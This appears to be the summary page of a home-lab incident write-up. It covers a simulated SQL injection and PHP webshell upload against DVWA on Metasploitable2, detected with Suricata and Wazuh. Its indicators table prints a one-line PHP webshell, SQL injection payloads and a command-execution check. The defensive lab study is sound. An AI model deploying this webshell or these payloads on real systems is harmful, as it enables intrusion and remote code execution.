[← Back to Main Writeup Index](../README.md)

# Incident Report — Web Application Attack (SQLi + Webshell Upload)

**Date:** 2026-10-18 to 2026-10-22
**Platform:** Self-built Home Lab (VirtualBox + Wazuh SIEM + Suricata IDS)
**Difficulty:** Medium-High
**Category:** Web Application Attack / Network-Based Detection

---

## Navigation

| # | Document | Content |
|---|----------|---------|
| 1 | [01-infrastructure-and-reconnaissance.md](./01-infrastructure-and-reconnaissance.md) | Suricata setup, Wazuh integration, Nmap recon |
| 2 | [02-exploitation.md](./02-exploitation.md) | SQL Injection and webshell upload |
| 3 | [03-detection-and-remediation.md](./03-detection-and-remediation.md) | Detection gaps, custom rule, containment |

---

## Executive Summary

A web application attack was simulated against DVWA hosted on Metasploitable2, combining SQL Injection and an unrestricted file upload vulnerability leading to Remote Code Execution via a webshell. Unlike Scenario 1 (host-based detection via Wazuh agent), this scenario used Suricata as a network-based IDS, newly deployed and integrated into the existing Wazuh SIEM. Initial detection attempts failed for both attack types due to two distinct root causes: an overly broad `HOME_NET` definition that left `EXTERNAL_NET` effectively empty, and the absence of any default signature covering webshell access patterns. Both gaps were resolved — the first via a configuration fix, the second via a custom Suricata rule — after which full detection coverage was achieved and verified. The engagement concluded with webshell eradication and attacker IP containment.

---

## Indicators of Compromise (IOC)

| Type | Value | Notes |
|---|---|---|
| Source IP (Attacker) | `192.168.56.102` | Kali Linux |
| Target IP (Victim) | `192.168.56.112` | Metasploitable2 |
| Target Application | DVWA v1.0.7 (security level: low) | Apache httpd 2.2.8 |
| SQLi Payloads | `'` ; `' OR '1'='1` | Error-based and bypass variants |
| Webshell File | `shell.php` | `<?php system($_GET['cmd']); ?>` |
| Webshell Path | `/dvwa/hackable/uploads/shell.php` | Uploaded without extension/type validation |
| RCE Confirmation | `uid=33(www-data)` | Command execution confirmed via `?cmd=id` |

---

## Key Findings

- Metasploitable2 exposed 20+ open ports via full port scan; DVWA (port 80) was selected as the primary web attack surface.
- Two SQL Injection variants were tested: error-based (`'`) and boolean bypass (`' OR '1'='1`). Only the error-based variant was detectable by available signatures — the bypass variant left no error trace for response-based detection to catch.
- File upload functionality had no extension or content-type validation, allowing a PHP webshell to be uploaded and executed, resulting in confirmed Remote Code Execution.
- Two distinct detection gaps were identified and resolved during this engagement:
  - A `EXTERNAL_NET` network variable misconfiguration that silently disabled all SQLi-related Suricata rules.
  - A total absence of signatures for webshell access patterns, closed with a custom rule.
- Containment and eradication were both completed, though executed in reverse of the ideal order — documented as a process improvement area.

See [03-detection-and-remediation.md](./03-detection-and-remediation.md) for full root cause analysis and remediation detail.
